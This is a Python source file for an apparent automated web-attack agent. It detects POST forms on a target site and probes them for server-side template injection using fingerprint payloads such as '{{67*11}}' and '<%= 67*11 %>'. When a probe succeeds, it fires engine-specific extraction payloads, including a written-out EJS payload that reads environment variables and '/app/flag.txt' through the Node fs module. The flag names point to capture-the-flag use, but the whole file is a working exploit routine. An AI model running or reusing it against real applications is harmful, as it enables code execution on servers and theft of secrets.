# This specialist is graph-only; the frozen base probe registry is unchanged.
# ruff: noqa: CPY001
from __future__ import annotations

from collections.abc import Mapping, Sequence
from dataclasses import dataclass
from typing import TYPE_CHECKING
from urllib.parse import urljoin, urlsplit

from ravage.probe_suite_parts.result import ProbeRunResult
from ravage.probes.specialists.ssti import _ssti_extraction_payloads
from ravage.web_core.http_probe import (
    ProbeResponse,
    ProbeSession,
    compare_responses,
    form_defaults,
)
from ravage.web_core.proof_recognizer import recognize_proofs

if TYPE_CHECKING:
    from ravage.agent_core.agent_state import AgentState

PROBE_NAME = "template_form_closure"
PROBE_PURPOSE = (
    "Use a preserved POST form contract to run a tiny template-dialect matrix "
    "and immediately attempt engine-specific proof extraction."
)

_DIALECT_CASES: tuple[tuple[str, str, str, tuple[str, ...]], ...] = (
    ("erb", "<%= 67*11 %>", "737", ("erb", "ejs")),
    ("jinja", "{{67*11}}", "737", ("jinja2", "twig", "nunjucks")),
    ("dollar", "${67*11}", "737", ("mako", "freemarker", "groovy")),
    ("hash", "#{67*11}", "737", ("velocity", "ruby")),
)
_DESCRIPTION_MARKERS = (
    "generate",
    "preview",
    "render",
    "repeat",
    "template",
    "format",
)
_ACTION_MARKERS = (
    "generate",
    "preview",
    "render",
    "repeat",
    "template",
    "format",
)
_TEXT_INPUT_TYPES = frozenset({"", "search", "text", "textarea"})
_SKIP_INPUT_NAMES = frozenset(
    {
        "csrf",
        "csrf_token",
        "csrfmiddlewaretoken",
        "_token",
        "password",
        "pass",
        "submit",
    }
)
_BASELINE_VALUE = "ravagebaseline"
_MAX_EXTRACTION_PAYLOADS = 6
_MIN_CONTRACT_SCORE = 70
_HTTP_SERVER_ERROR_MIN = 500


@dataclass(frozen=True)
class TemplateFormContract:
    endpoint: str
    method: str
    payload_field: str
    required_fields: tuple[str, ...]
    evidence: tuple[str, ...]

    def to_json(self) -> dict[str, object]:
        return {
            "endpoint": self.endpoint,
            "method": self.method,
            "payload_field": self.payload_field,
            "required_fields": list(self.required_fields),
            "evidence": list(self.evidence),
        }


def template_form_contract(state: AgentState) -> TemplateFormContract | None:
    """Return one evidence-backed form contract without reading target source."""
    target_url = str(state.surface.get("target_url") or "")
    description = str(state.surface.get("visible_description") or "").lower()
    prior_ssti = _prior_ssti_attempt(state)
    description_markers = tuple(marker for marker in _DESCRIPTION_MARKERS if marker in description)
    if not prior_ssti and not description_markers:
        return None

    candidates: list[tuple[int, int, TemplateFormContract]] = []
    for index, form in enumerate(_mapping_sequence(state.surface.get("forms"))):
        method = str(form.get("method") or "GET").upper()
        if method != "POST":
            continue
        endpoint = urljoin(
            target_url,
            str(form.get("action") or target_url),
        )
        if not _same_origin(endpoint, target_url):
            continue
        inputs = _mapping_sequence(form.get("inputs"))
        required_fields = tuple(
            dict.fromkeys(
                str(item.get("name") or "").strip()
                for item in inputs
                if str(item.get("name") or "").strip() and not item.get("disabled")
            )
        )
        for input_field in inputs:
            name = str(input_field.get("name") or "").strip()
            input_type = str(input_field.get("type") or "text").lower()
            if (
                not name
                or name.lower() in _SKIP_INPUT_NAMES
                or input_type not in _TEXT_INPUT_TYPES
                or input_field.get("disabled")
            ):
                continue
            action_markers = tuple(
                marker
                for marker in _ACTION_MARKERS
                if marker in endpoint.lower() or marker in name.lower()
            )
            score = 0
            score += 140 if prior_ssti else 0
            score += len(description_markers) * 35
            score += len(action_markers) * 45
            score += 30 if any(_is_numeric_input(item) for item in inputs) else 0
            score += 20 if input_field.get("required") else 0
            evidence = (
                *(("prior_ssti_attempt",) if prior_ssti else ()),
                *(f"description:{marker}" for marker in description_markers),
                *(f"form:{marker}" for marker in action_markers),
                *(
                    ("numeric_companion",)
                    if any(_is_numeric_input(item) for item in inputs)
                    else ()
                ),
            )
            candidates.append(
                (
                    score,
                    -index,
                    TemplateFormContract(
                        endpoint=endpoint,
                        method=method,
                        payload_field=name,
                        required_fields=required_fields,
                        evidence=tuple(dict.fromkeys(evidence)),
                    ),
                )
            )
    if not candidates:
        return None
    candidates.sort(key=lambda item: (-item[0], -item[1], item[2].endpoint))
    score, _index, contract = candidates[0]
    return contract if score >= _MIN_CONTRACT_SCORE else None


def probe_template_form_closure(
    session: ProbeSession,
    state: AgentState,
) -> ProbeRunResult:
    contract = template_form_contract(state)
    if contract is None:
        return ProbeRunResult(
            ok=False,
            probe=PROBE_NAME,
            summary="no evidence-backed template form contract",
            errors=["template_form_contract_unavailable"],
        )
    form = _matching_form(state, contract)
    if form is None:
        return ProbeRunResult(
            ok=False,
            probe=PROBE_NAME,
            summary="template form contract no longer matches observed state",
            errors=["template_form_contract_stale"],
        )

    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    baseline_fields, baseline = _submit_payload(
        session,
        form,
        contract=contract,
        payload=_BASELINE_VALUE,
    )
    requests.append(
        baseline.summary(body_chars=260)
        | {
            "probe_kind": "template_form_baseline",
            "contract": contract.to_json(),
        }
    )
    if baseline.status is None or baseline.status >= _HTTP_SERVER_ERROR_MIN:
        return ProbeRunResult(
            ok=False,
            probe=PROBE_NAME,
            summary="template form baseline was unavailable",
            requests=requests,
            errors=[baseline.error or f"baseline_status:{baseline.status}"],
        )

    tested = 0
    for dialect, payload, expected, engines in _DIALECT_CASES:
        fields, response = _submit_payload(
            session,
            form,
            contract=contract,
            payload=payload,
        )
        tested += 1
        delta = compare_responses(baseline, response, marker=payload)
        requests.append(
            response.summary(body_chars=420)
            | {
                "probe_kind": "template_form_fingerprint",
                "dialect": dialect,
                "payload": payload,
                "delta": delta.to_json(),
            }
        )
        if _request_budget_exhausted(response):
            break
        if not _evaluated_expression(
            response,
            baseline=baseline,
            payload=payload,
            expected=expected,
        ):
            continue

        signal = {
            "type": "ssti_fingerprint_signal",
            "input": contract.to_json(),
            "payload": payload,
            "expected": [expected],
            "engine_candidates": list(engines),
            "signal": {
                "kind": "evaluated_expression",
                "observed": expected,
            },
            "delta": delta.to_json(),
            "response": response.summary(body_chars=520),
            "baseline_replay": _replay(
                contract,
                baseline_fields,
            ),
            "replay": _replay(contract, fields),
        }
        proof_finding, proof_requests = _extract_template_form_proof(
            session,
            form,
            contract=contract,
            engines=engines,
        )
        requests.extend(proof_requests)
        findings.append(proof_finding or signal)
        break

    return ProbeRunResult(
        ok=bool(findings),
        probe=PROBE_NAME,
        summary=(
            f"tested {tested} bounded template dialect(s) against one preserved "
            f"POST form; findings={len(findings)}"
        ),
        findings=findings,
        requests=requests,
    )


def _extract_template_form_proof(
    session: ProbeSession,
    form: dict[str, object],
    *,
    contract: TemplateFormContract,
    engines: tuple[str, ...],
) -> tuple[dict[str, object] | None, list[dict[str, object]]]:
    requests: list[dict[str, object]] = []
    payloads = _engine_extraction_payloads(engines)
    for payload in payloads[:_MAX_EXTRACTION_PAYLOADS]:
        fields, response = _submit_payload(
            session,
            form,
            contract=contract,
            payload=payload,
        )
        requests.append(
            response.summary(body_chars=900)
            | {
                "probe_kind": "template_form_extract",
                "engine_candidates": list(engines),
                "payload": payload,
            }
        )
        if _request_budget_exhausted(response):
            break
        proofs = recognize_proofs(response.body)
        if not proofs:
            continue
        return (
            {
                "type": "ssti_extracted_proof",
                "input": contract.to_json(),
                "engine_candidates": list(engines),
                "payload": payload,
                "proof": proofs[0],
                "proofs": proofs,
                "response": response.summary(body_chars=1_200),
                "replay": _replay(contract, fields),
            },
            requests,
        )
    return None, requests


def _engine_extraction_payloads(engines: tuple[str, ...]) -> list[str]:
    engine_set = set(engines)
    payloads: list[str] = []
    if "ejs" in engine_set:
        payloads.append(
            "<%= process.env.FLAG || process.env.CTF_FLAG || "
            "require('fs').readFileSync('/app/flag.txt','utf8') %>"
        )
    payloads.extend(_ssti_extraction_payloads(list(engines)))
    return list(dict.fromkeys(payloads))


def _submit_payload(
    session: ProbeSession,
    form: dict[str, object],
    *,
    contract: TemplateFormContract,
    payload: str,
) -> tuple[dict[str, str], ProbeResponse]:
    fields = form_defaults(
        form,
        marker_name=contract.payload_field,
        marker=payload,
    )
    return fields, session.post_form(contract.endpoint, fields)


def _evaluated_expression(
    response: ProbeResponse,
    *,
    baseline: ProbeResponse,
    payload: str,
    expected: str,
) -> bool:
    if response.status is None or response.status >= _HTTP_SERVER_ERROR_MIN:
        return False
    if expected not in response.body or expected in baseline.body:
        return False
    position = response.body.find(expected)
    surrounding = response.body[max(position - 120, 0) : position + len(expected) + 120]
    return payload not in surrounding


def _request_budget_exhausted(response: ProbeResponse) -> bool:
    return "graph_target_request_budget_exhausted" in response.error


def _matching_form(
    state: AgentState,
    contract: TemplateFormContract,
) -> dict[str, object] | None:
    target_url = str(state.surface.get("target_url") or "")
    for form in _mapping_sequence(state.surface.get("forms")):
        endpoint = urljoin(
            target_url,
            str(form.get("action") or target_url),
        )
        names = {
            str(item.get("name") or "").strip() for item in _mapping_sequence(form.get("inputs"))
        }
        if (
            endpoint == contract.endpoint
            and str(form.get("method") or "GET").upper() == contract.method
            and contract.payload_field in names
        ):
            return dict(form)
    return None


def _replay(
    contract: TemplateFormContract,
    fields: Mapping[str, str],
) -> dict[str, object]:
    return {
        "method": contract.method,
        "url": contract.endpoint,
        "payload_field": contract.payload_field,
        "form": dict(fields),
        "required_fields": list(contract.required_fields),
        "encoding": "application/x-www-form-urlencoded",
    }


def _prior_ssti_attempt(state: AgentState) -> bool:
    for action in state.actions:
        if str(action.get("probe") or "") in {
            "server_rendering",
            "ssti_fingerprint",
            PROBE_NAME,
        }:
            return True
    for attempt in state.attempts:
        for key in ("selected_action", "proposed_action"):
            action = attempt.get(key)
            if isinstance(action, dict) and str(action.get("probe") or "") in {
                "server_rendering",
                "ssti_fingerprint",
                PROBE_NAME,
            }:
                return True
    return False


def _is_numeric_input(value: Mapping[str, object]) -> bool:
    name = str(value.get("name") or "").lower()
    input_type = str(value.get("type") or "").lower()
    return input_type in {"number", "range"} or any(
        marker in name for marker in ("count", "number", "repeat", "times")
    )


def _same_origin(left: str, right: str) -> bool:
    try:
        left_parts = urlsplit(left)
        right_parts = urlsplit(right)
    except ValueError:
        return False
    return (
        left_parts.scheme.lower(),
        left_parts.hostname,
        left_parts.port,
    ) == (
        right_parts.scheme.lower(),
        right_parts.hostname,
        right_parts.port,
    )


def _mapping_sequence(value: object) -> list[dict[str, object]]:
    if not isinstance(value, Sequence) or isinstance(value, (str, bytes)):
        return []
    return [dict(item) for item in value if isinstance(item, Mapping)]


__all__ = [
    "PROBE_NAME",
    "PROBE_PURPOSE",
    "TemplateFormContract",
    "probe_template_form_closure",
    "template_form_contract",
]
